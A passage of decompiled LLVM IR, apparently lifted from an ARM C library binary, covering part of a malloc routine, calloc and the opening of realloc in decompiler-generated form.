  %v3_13bd0 = load i32, i32* %v2_13bd0, align 4
  %v0_13bd4 = load i32, i32* @r8, align 4
  %v2_13bd4 = icmp eq i32 %v0_13bd4, 0
  %v0_13bd8 = load i32, i32* @r5, align 4
  %v2_13bd8 = add i32 %v0_13bd8, %v3_13bd0
  store i32 %v2_13bd8, i32* %r3.global-to-local, align 4
  store i32 %v2_13bd8, i32* %v2_13bd0, align 4
  %v0_13be0 = load i32, i32* @r7, align 4
  %v1_13be0 = load i32, i32* @r6, align 4
  %v2_13be0 = add i32 %v1_13be0, 44
  %v3_13be0 = inttoptr i32 %v2_13be0 to i32*
  store i32 %v0_13be0, i32* %v3_13be0, align 4
  br i1 %v2_13bd4, label %dec_label_pc_13c30, label %dec_label_pc_13be8

dec_label_pc_13be8:                               ; preds = %dec_label_pc_13bb4
  %v0_13bec = load i32, i32* @r8, align 4
  %v1_13bec = add i32 %v0_13bec, -12
  %v1_13bf0 = and i32 %v1_13bec, -8
  store i32 %v3_139b8, i32* %ip.global-to-local, align 4
  %v2_13bf8 = add i32 %v1_13bf0, %v3_139b8
  store i32 %v2_13bf8, i32* %r1.global-to-local, align 4
  %v2_13bfc = icmp ugt i32 %v1_13bf0, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_13c04 = or i32 %v1_13bf0, 1
  store i32 %v1_13c04, i32* %r3.global-to-local, align 4
  store i32 %v1_13c04, i32* %v2_139c4, align 4
  %v0_13c0c = load i32, i32* %r2.global-to-local, align 4
  %v1_13c0c = load i32, i32* %r1.global-to-local, align 4
  %v2_13c0c = add i32 %v1_13c0c, 8
  %v3_13c0c = inttoptr i32 %v2_13c0c to i32*
  store i32 %v0_13c0c, i32* %v3_13c0c, align 4
  %v0_13c10 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c10 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c10 = add i32 %v1_13c10, 4
  %v3_13c10 = inttoptr i32 %v2_13c10 to i32*
  store i32 %v0_13c10, i32* %v3_13c10, align 4
  br i1 %v2_13bfc, label %dec_label_pc_13c18, label %dec_label_pc_13c30

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13be8
  %v0_13c18 = load i32, i32* @r6, align 4
  %v1_13c18 = add i32 %v0_13c18, 836
  %v2_13c18 = inttoptr i32 %v1_13c18 to i32*
  %v3_13c18 = load i32, i32* %v2_13c18, align 4
  store i32 %v3_13c18, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_13c20 = load i32, i32* %ip.global-to-local, align 4
  %v1_13c20 = add i32 %v0_13c20, 8
  store i32 %v1_13c20, i32* @r0, align 4
  store i32 -1, i32* %v2_13c18, align 4
  %v0_13c28 = call i32 @free()
  store i32 %v0_13c28, i32* %r0.global-to-local, align 4
  %v0_13c2c = load i32, i32* @r4, align 4
  %v1_13c2c = load i32, i32* @r6, align 4
  %v2_13c2c = add i32 %v1_13c2c, 836
  %v3_13c2c = inttoptr i32 %v2_13c2c to i32*
  store i32 %v0_13c2c, i32* %v3_13c2c, align 4
  br label %dec_label_pc_13c30

dec_label_pc_13c30:                               ; preds = %.thread37, %dec_label_pc_13be8, %dec_label_pc_13bb4, %dec_label_pc_13bac, %dec_label_pc_13c18
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r0.global-to-local, align 4
  %v4_13c38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 64) to i32*), align 4
  store i32 %v4_13c38, i32* %lr.global-to-local, align 4
  %v1_13c3c = add i32 %v4_13c38, 872
  store i32 %v1_13c3c, i32* %r1.global-to-local, align 4
  %v1_13c40 = inttoptr i32 %v1_13c3c to i32*
  %v2_13c40 = load i32, i32* %v1_13c40, align 4
  store i32 %v2_13c40, i32* %r1.global-to-local, align 4
  %v3_13c40 = add i32 %v4_13c38, 876
  %v4_13c40 = inttoptr i32 %v3_13c40 to i32*
  %v5_13c40 = load i32, i32* %v4_13c40, align 4
  store i32 %v5_13c40, i32* %r3.global-to-local, align 4
  %v1_13c48 = add i32 %v4_13c38, 868
  %v2_13c48 = inttoptr i32 %v1_13c48 to i32*
  %v3_13c48 = load i32, i32* %v2_13c48, align 4
  store i32 %v3_13c48, i32* %r3.global-to-local, align 4
  %v1_13c4c = add i32 %v4_13c38, 884
  %v2_13c4c = inttoptr i32 %v1_13c4c to i32*
  %v3_13c4c = load i32, i32* %v2_13c4c, align 4
  store i32 %v3_13c4c, i32* %r2.global-to-local, align 4
  %v2_13c50 = add i32 %v3_13c48, %v2_13c40
  store i32 %v2_13c50, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_13c40, %v5_13c40
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_13c30
  store i32 %v2_13c40, i32* %v4_13c40, align 4
  %v0_13c58.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_13c58.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_13c30, %bb168
  %v1_13c58 = phi i32 [ %v3_13c4c, %dec_label_pc_13c30 ], [ %v1_13c58.pre, %bb168 ]
  %v4_13c5c = phi i32 [ %v2_13c50, %dec_label_pc_13c30 ], [ %v0_13c58.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_13c5c, %v1_13c58
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_13c5c = load i32, i32* %lr.global-to-local, align 4
  %v6_13c5c = add i32 %v5_13c5c, 884
  %v7_13c5c = inttoptr i32 %v6_13c5c to i32*
  store i32 %v4_13c5c, i32* %v7_13c5c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_13c60 = load i32, i32* %lr.global-to-local, align 4
  %v1_13c60 = add i32 %v0_13c60, 44
  %v2_13c60 = inttoptr i32 %v1_13c60 to i32*
  %v3_13c60 = load i32, i32* %v2_13c60, align 4
  store i32 %v3_13c60, i32* %ip.global-to-local, align 4
  %v1_13c64 = add i32 %v3_13c60, 4
  %v2_13c64 = inttoptr i32 %v1_13c64 to i32*
  %v3_13c64 = load i32, i32* %v2_13c64, align 4
  store i32 %v1_13878, i32* %r1.global-to-local, align 4
  %v1_13c6c = and i32 %v3_13c64, -4
  store i32 %v1_13c6c, i32* %r3.global-to-local, align 4
  %v3_13c70 = icmp ult i32 %v1_13c6c, %v1_13878
  br i1 %v3_13c70, label %dec_label_pc_13c9c, label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %bb171
  %v0_13c78 = load i32, i32* @sl, align 4
  %v2_13c78 = sub i32 %v1_13c6c, %v0_13c78
  %v2_13c7c = add i32 %v0_13c78, %v3_13c60
  store i32 %v2_13c7c, i32* %r1.global-to-local, align 4
  %v1_13c80 = or i32 %v2_13c78, 1
  store i32 %v1_13c80, i32* %r3.global-to-local, align 4
  %v1_13c84 = or i32 %v0_13c78, 1
  store i32 %v1_13c84, i32* %r2.global-to-local, align 4
  %v1_13c88 = add i32 %v3_13c60, 8
  store i32 %v1_13c88, i32* %r0.global-to-local, align 4
  store i32 %v1_13c84, i32* %v2_13c64, align 4
  %v0_13c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c90 = load i32, i32* %lr.global-to-local, align 4
  %v2_13c90 = add i32 %v1_13c90, 44
  %v3_13c90 = inttoptr i32 %v2_13c90 to i32*
  store i32 %v0_13c90, i32* %v3_13c90, align 4
  %v0_13c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_13c94 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c94 = add i32 %v1_13c94, 4
  %v3_13c94 = inttoptr i32 %v2_13c94 to i32*
  store i32 %v0_13c94, i32* %v3_13c94, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13c9c:                               ; preds = %bb160, %bb171, %dec_label_pc_13a78
  store i32 63352, i32* %r3.global-to-local, align 4
  %v0_13ca0 = call i32 @__aeabi_read_tp()
  %v3_13ca4 = load i16, i16* @global_var_23424.488, align 2
  %v4_13ca4 = sext i16 %v3_13ca4 to i32
  store i32 %v4_13ca4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_13cac = add i32 %v4_13ca4, %v0_13ca0
  %v4_13cac = inttoptr i32 %v3_13cac to i32*
  store i32 12, i32* %v4_13cac, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13cb4

dec_label_pc_13cb4:                               ; preds = %bb154, %bb153, %dec_label_pc_13c78, %dec_label_pc_138c0, %dec_label_pc_13c9c
  %v0_13cb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13cb4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13cb8

dec_label_pc_13cb8:                               ; preds = %.thread4, %dec_label_pc_1388c, %.thread124, %dec_label_pc_136fc, %dec_label_pc_136f0, %dec_label_pc_13558, %dec_label_pc_134dc, %dec_label_pc_13cb4
  store i32 %v2_133fc, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v4_13cc8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 44) to i32*), align 4
  store i32 %v4_13cc8, i32* @ip, align 4
  store i32 81108, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13cc8)
  br label %dec_label_pc_13cd4

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13434, %dec_label_pc_13cb8
  %v0_13cd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13cd4, i32* %r0.global-to-local, align 4
  store i32 %v3_133d0, i32* @r4, align 4
  store i32 %v6_133d0, i32* @r5, align 4
  store i32 %v9_133d0, i32* @r6, align 4
  store i32 %v12_133d0, i32* @r7, align 4
  store i32 %v15_133d0, i32* @r8, align 4
  store i32 %v18_133d0, i32* @sb, align 4
  store i32 %v21_133d0, i32* @sl, align 4
  store i32 %v24_133d0, i32* @fp, align 4
  store i32 %v27_133d0, i32* @lr, align 4
  ret i32 %v0_13cd4

; uselistorder directives
  uselistorder i32 %v0_13c78, { 1, 0, 2 }
  uselistorder i32 %v3_13c60, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13c5c, { 1, 0 }
  uselistorder i32 %v2_13c40, { 2, 0, 1, 3 }
  uselistorder i32 %v4_13c38, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13bf0, { 1, 2, 0 }
  uselistorder i32 %v0_13bb8, { 1, 0 }
  uselistorder i32 %v0_13bac, { 1, 0 }
  uselistorder i32 %v2_13b9c, { 1, 0 }
  uselistorder i32 %v2_13b2c, { 2, 1, 0 }
  uselistorder i32 %v2_13b14, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13b0c, { 1, 0, 2 }
  uselistorder i32 %v1_13b08, { 2, 1, 0 }
  uselistorder i32 %v0_13b08, { 3, 1, 2, 0 }
  uselistorder i32 %v1_13aec, { 1, 0 }
  uselistorder i32 %v2_13ac4, { 1, 0 }
  uselistorder i32 %v3_13ab8, { 1, 0, 2 }
  uselistorder i32 %v2_13a98, { 1, 0, 2 }
  uselistorder i32* %v2_13a90, { 1, 0, 2 }
  uselistorder i32 %v0_13a78, { 1, 0 }
  uselistorder i32 %v6_13a54, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13a40, { 2, 1, 0 }
  uselistorder i32 %v0_13a28, { 1, 0 }
  uselistorder i32 %v2_139e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_139e0, { 1, 0 }
  uselistorder i32 %v3_139b8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_13998, { 1, 0, 2 }
  uselistorder i32 %v2_13980, { 1, 2, 0, 3 }
  uselistorder i32 %v1_13928, { 2, 1, 0 }
  uselistorder i32 %v6_1391c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_138f8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_138b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13878, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_13870, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1386c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_13858, { 1, 0 }
  uselistorder i32 %v7_13818, { 1, 0 }
  uselistorder i32 %v4_13818, { 1, 0 }
  uselistorder i32 %v0_137e8, { 1, 0 }
  uselistorder i32 %v2_137bc, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_137b857, { 1, 0 }
  uselistorder i32 %v1_13784, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1376c., { 1, 2, 0 }
  uselistorder i32 %v0_13774, { 0, 1, 3, 2 }
  uselistorder i32 %v1_13774, { 1, 0 }
  uselistorder i32 %v3_13754, { 1, 0 }
  uselistorder i32 %v4_13750, { 1, 0, 2 }
  uselistorder i32 %v1_136c0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13718, { 1, 0 }
  uselistorder i32 %v1_136fc, { 1, 0 }
  uselistorder i32 %v1_1359c, { 1, 0 }
  uselistorder i32 %v0_136dc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_136a4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_13738.pre, { 1, 2, 0 }
  uselistorder i32 %v0_13680, { 2, 1, 0 }
  uselistorder i32 %v3_13674, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_13594, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1363c, { 1, 0 }
  uselistorder i32 %v3_13630, { 1, 0 }
  uselistorder i32 %v0_1363c, { 1, 0 }
  uselistorder i32 %v3_13614, { 0, 2, 3, 1 }
  uselistorder i32 %v2_13604, { 1, 0, 2 }
  uselistorder i32 %v3_135bc, { 2, 1, 0 }
  uselistorder i32 %v0_135ac, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1357c, { 1, 0 }
  uselistorder i32 %v1_13530, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1352c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_134d0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_134c4, { 1, 0 }
  uselistorder i32 %v3_13494, { 1, 0 }
  uselistorder i32 %v0_13488, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13468, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1345c, { 1, 0 }
  uselistorder i32 %v0_1342c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 110, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_13cd4, { 1, 0 }
  uselistorder label %dec_label_pc_13cb8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13cb4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13c9c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_13c30, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_13bac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13ba4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13a78, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_139ac, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_13864, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_137b8, { 1, 0 }
  uselistorder label %dec_label_pc_137c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13784, { 1, 0 }
  uselistorder label %dec_label_pc_13738, { 1, 0 }
  uselistorder label %dec_label_pc_136cc, { 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 1, 0 }
  uselistorder label %dec_label_pc_13674, { 1, 0 }
  uselistorder label %dec_label_pc_13660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13628, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13614, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_13ce8(i32 %arg1) local_unnamed_addr {
dec_label_pc_13ce8:
  %v0_13ce8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13ce8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13ce8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13ce8, %bb
  %v4_13d04 = phi i32 [ %arg1, %dec_label_pc_13ce8 ], [ 0, %bb ]
  ret i32 %v4_13d04

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_13d08 = load i32, i32* @r4, align 4
  %v6_13d08 = load i32, i32* @r5, align 4
  %v9_13d08 = load i32, i32* @r6, align 4
  %v12_13d08 = load i32, i32* @lr, align 4
  %v2_13d10 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_13d20 = mul i32 %arg2, %arg1
  store i32 %v2_13d20, i32* @r6, align 4
  br i1 %v2_13d10, label %dec_label_pc_13d58, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_13d30 = udiv i32 %v2_13d20, %arg1
  %v9_13d34 = icmp eq i32 %v2_13d30, %arg2
  br i1 %v9_13d34, label %dec_label_pc_13d58, label %dec_label_pc_13d3c

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d28
  %v0_13d40 = call i32 @__aeabi_read_tp()
  %v3_13d44 = load i16, i16* @global_var_23424.488, align 2
  %v4_13d44 = sext i16 %v3_13d44 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13d50 = add i32 %v4_13d44, %v0_13d40
  %v4_13d50 = inttoptr i32 %v3_13d50 to i32*
  store i32 12, i32* %v4_13d50, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13d58:                               ; preds = %dec_label_pc_13d28, %entry
  %v4_13d5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 108) to i32*), align 4
  store i32 %v4_13d5c, i32* @r4, align 4
  %v4_13d74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  store i32 %v4_13d74, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13d74)
  %v0_13d88 = load i32, i32* @r5, align 4
  %v2_13d88 = add i32 %v0_13d88, 16
  %v3_13d88 = inttoptr i32 %v2_13d88 to i32*
  %v4_13d88 = load i32, i32* %v3_13d88, align 4
  store i32 %v4_13d88, i32* %ip.global-to-local, align 4
  store i32 81300, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13d88)
  %v0_13d94 = load i32, i32* @r6, align 4
  store i32 %v0_13d94, i32* @r0, align 4
  %v0_13d98 = call i32 @malloc()
  store i32 %v0_13d98, i32* %r4.global-to-local, align 4
  %v2_13d9c = icmp eq i32 %v0_13d98, 0
  br i1 %v2_13d9c, label %.thread, label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13d58
  %v1_13da4 = add i32 %v0_13d98, -4
  %v2_13da4 = inttoptr i32 %v1_13da4 to i32*
  %v3_13da4 = load i32, i32* %v2_13da4, align 4
  %v1_13da8 = and i32 %v3_13da4, 2
  %v2_13da8 = icmp eq i32 %v1_13da8, 0
  br i1 %v2_13da8, label %dec_label_pc_13db0, label %.thread

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13da4
  %v1_13db06 = add i32 %v3_13da4, -4
  %v1_13db4 = and i32 %v1_13db06, -4
  %v3_13db8 = udiv i32 %v1_13db4, 4
  store i32 %v3_13db8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_13db4, 36
  %v2_13dc0 = icmp ult i32 %v1_13db4, 33
  %v3_13dc0 = or i1 %tmp, %v2_13dc0
  br i1 %v3_13dc0, label %dec_label_pc_13dcc, label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13db0
  %v3_13dc4 = inttoptr i32 %v0_13d98 to i8*
  %v4_13dc4 = call i32 @__GI_memset(i8* %v3_13dc4, i32 0, i32 %v1_13db4)
  br label %.thread

dec_label_pc_13dcc:                               ; preds = %dec_label_pc_13db0
  %tmp7 = icmp eq i32 %v1_13db4, 16
  %v2_13dd0 = inttoptr i32 %v0_13d98 to i32*
  store i32 0, i32* %v2_13dd0, align 4
  %v1_13dd4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dd4 = add i32 %v1_13dd4, 4
  %v3_13dd4 = inttoptr i32 %v2_13dd4 to i32*
  store i32 0, i32* %v3_13dd4, align 4
  %v1_13dd8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13dd8 = add i32 %v1_13dd8, 8
  %v3_13dd8 = inttoptr i32 %v2_13dd8 to i32*
  store i32 0, i32* %v3_13dd8, align 4
  %v2_13ddc = icmp ult i32 %v1_13db4, 13
  %v3_13ddc = or i1 %tmp7, %v2_13ddc
  br i1 %v3_13ddc, label %.thread, label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dcc
  %v0_13de0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13de4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13de4 = add i32 %v1_13de4, 12
  %v3_13de4 = inttoptr i32 %v2_13de4 to i32*
  store i32 0, i32* %v3_13de4, align 4
  %v1_13de8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13de8 = add i32 %v1_13de8, 16
  %v3_13de8 = inttoptr i32 %v2_13de8 to i32*
  store i32 0, i32* %v3_13de8, align 4
  %tmp8 = icmp ult i32 %v0_13de0, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %dec_label_pc_13de0
  %v0_13df0 = load i32, i32* %ip.global-to-local, align 4
  %v7_13df0 = icmp eq i32 %v0_13df0, 9
  %v1_13df4 = load i32, i32* %r4.global-to-local, align 4
  %v2_13df4 = add i32 %v1_13df4, 20
  %v3_13df4 = inttoptr i32 %v2_13df4 to i32*
  store i32 0, i32* %v3_13df4, align 4
  %v1_13df8 = load i32, i32* %r4.global-to-local, align 4
  %v2_13df8 = add i32 %v1_13df8, 24
  %v3_13df8 = inttoptr i32 %v2_13df8 to i32*
  store i32 0, i32* %v3_13df8, align 4
  br i1 %v7_13df0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13df0
  %v2_13dfc = load i32, i32* %r4.global-to-local, align 4
  %v3_13dfc = add i32 %v2_13dfc, 32
  %v4_13dfc = inttoptr i32 %v3_13dfc to i32*
  store i32 0, i32* %v4_13dfc, align 4
  %v2_13e00 = load i32, i32* %r4.global-to-local, align 4
  %v3_13e00 = add i32 %v2_13e00, 28
  %v4_13e00 = inttoptr i32 %v3_13e00 to i32*
  store i32 0, i32* %v4_13e00, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13df0, %dec_label_pc_13da4, %dec_label_pc_13de0, %dec_label_pc_13dcc, %dec_label_pc_13d58, %dec_label_pc_13dc4, %bb
  store i32 1, i32* @r1, align 4
  %v0_13e10 = load i32, i32* @r5, align 4
  %v2_13e10 = add i32 %v0_13e10, 44
  %v3_13e10 = inttoptr i32 %v2_13e10 to i32*
  %v4_13e10 = load i32, i32* %v3_13e10, align 4
  store i32 %v4_13e10, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13e10)
  br label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13d3c, %.thread
  %v0_13e1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_13d08, i32* @r4, align 4
  store i32 %v6_13d08, i32* @r5, align 4
  store i32 %v9_13d08, i32* @r6, align 4
  store i32 %v12_13d08, i32* @lr, align 4
  ret i32 %v0_13e1c

; uselistorder directives
  uselistorder i32 %v1_13db4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_13d98, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 2, 7, 3, 8, 4, 9, 5, 10, 11, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13e1c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13e48 = load i32, i32* @r4, align 4
  %v6_13e48 = load i32, i32* @r5, align 4
  %v9_13e48 = load i32, i32* @r6, align 4
  %v12_13e48 = load i32, i32* @r7, align 4
  %v15_13e48 = load i32, i32* @r8, align 4
  %v18_13e48 = load i32, i32* @sb, align 4
  %v21_13e48 = load i32, i32* @sl, align 4
  %v24_13e48 = load i32, i32* @fp, align 4
  %v27_13e48 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13e54 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13e54, label %dec_label_pc_13e68, label %dec_label_pc_13e78

dec_label_pc_13e68:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_13e6c = call i32 @malloc()
  store i32 %v0_13e6c, i32* %r0.global-to-local, align 4
  store i32 %v0_13e6c, i32* @r4, align 4
  br label %dec_label_pc_141d8

dec_label_pc_13e78:                               ; preds = %entry
  %v2_13e78 = icmp eq i32 %arg2, 0
